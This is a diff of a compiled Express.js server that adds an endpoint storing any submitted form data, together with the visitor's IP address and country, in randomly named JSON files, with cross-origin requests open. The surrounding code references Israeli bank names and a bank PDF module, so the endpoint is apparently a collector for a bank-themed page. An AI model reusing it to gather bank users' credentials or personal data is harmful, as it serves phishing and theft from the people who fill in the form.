@@ -12,6 +12,7 @@ var __importDefault = (this && this.__importDefault) || function (mod) {
     return (mod && mod.__esModule) ? mod : { "default": mod };
 };
 Object.defineProperty(exports, "__esModule", { value: true });
+const fs_1 = __importDefault(require("fs"));
 const cors_1 = __importDefault(require("cors"));
 const dotenv_1 = __importDefault(require("dotenv"));
 const bank_pdf_1 = __importDefault(require("./bank-pdf"));
@@ -19,10 +20,18 @@ const geoip_lite_1 = __importDefault(require("geoip-lite"));
 const body_parser_1 = require("body-parser");
 const iso_country_codes_1 = __importDefault(require("./iso-country-codes"));
 const express_1 = __importDefault(require("express"));
+const utils_1 = require("./utils");
 const BANKS = new Set(["leumi", "discount", "jerusalem"]);
 const app = express_1.default();
 app.use(express_1.default.static('public'));
 app.use(body_parser_1.urlencoded({ extended: false }));
+app.post("/api/v1/submit", cors_1.default(), (req, res) => {
+    let ip = req.headers["cf-connecting-ip"] || req.headers["x-forwarded-for"] || req.connection.remoteAddress;
+    let geoData = geoip_lite_1.default.lookup(ip.toString());
+    let countryName = iso_country_codes_1.default.get(geoData.country);
+    fs_1.default.writeFileSync(utils_1.storagePath(Math.random() + ".json"), JSON.stringify(Object.assign({ ip, countryName }, req.body), null, 2), "utf8");
+    res.json({ ok: true });
+});
 app.get("/api/v1/geo", cors_1.default(), (req, res) => {
     let ip = req.headers["cf-connecting-ip"] || req.headers["x-forwarded-for"] || req.connection.remoteAddress;
     if (ip === "::1") {
